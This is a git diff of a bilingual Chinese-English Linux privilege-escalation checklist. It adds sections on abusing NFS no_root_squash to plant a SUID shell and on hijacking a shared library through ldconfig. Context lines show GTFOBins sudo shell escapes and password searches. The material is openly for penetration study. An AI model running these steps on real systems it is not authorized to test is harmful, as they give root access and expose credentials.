@@ -1,6 +1,6 @@
 ### Checklists - linux 提权之前必要信息搜集
 
-密码
+#### 密码搜集
 
 ```
 # ---------------
@@ -40,10 +40,9 @@ $ locate password | more
 ```
 
 
+#### Scheduled tasks
 
 计划任务
-
-Scheduled tasks
 
 ```
 # ---------------
@@ -124,9 +123,10 @@ sudo chmod +s /tmp/suid # setuid bit
 ```
 
 
-Capabilities
+#### Capabilities
 
 功能
+
 ```
 # ---------------
 # List capabilities of binaries
@@ -181,7 +181,8 @@ uid=0(root) gid=1000(swissky)
 ```
 
 
-SUDO
+#### SUDO
+
 ```
 # ---------------
 # NOPASSWD
@@ -271,7 +272,7 @@ Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master
 ```
 
 
-GTFOBins
+#### GTFOBins
 
 https://gtfobins.github.io/
 
@@ -287,7 +288,7 @@ sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
 
-Wildcard
+#### Wildcard
 
 通配符
 
@@ -309,16 +310,73 @@ tar cf archive.tar *
 ```
 
 
-Writable files
+#### Writable files
 
 可写文件
 ```
 find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
 ```
 
+#### NFS Root Squashing
+
+When **no_root_squash** appears in `/etc/exports`, the folder is shareable and a remote user can mount it.
+
+当no_root_squash出现在`/etc/exports`中时，该文件夹是可共享的，远程用户可以挂载它
+
+```
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir 
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash . 	
+
+# set suid permission
+chmod +s bash 	
+```
+
+#### Shared Library
+
+* 1. ldconfig
+
+
+Identify shared libraries with `ldd`
+
+使用`ldd`识别共享库
+
+```
+$ ldd /opt/binary
+    linux-vdso.so.1 (0x00007ffe961cd000)
+    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
+    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        
+```
+
+Create a library in `/tmp` and activate the path.
+
+在`/tmp`中创建一个库并激活路径
+
+```
+gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
+echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so
+/opt/binary
+```
+
+* 2. RPATH
+
 （未完）
 
-### linux提权
+
+#### Groups
+
+* Docker
+* LXC/LXD
+
+#### Kernel Exploits
+
+利用linux内核漏洞提权
 
 |名称|类型|适用环境|描述|
 |:-------------:|--|--|-----|
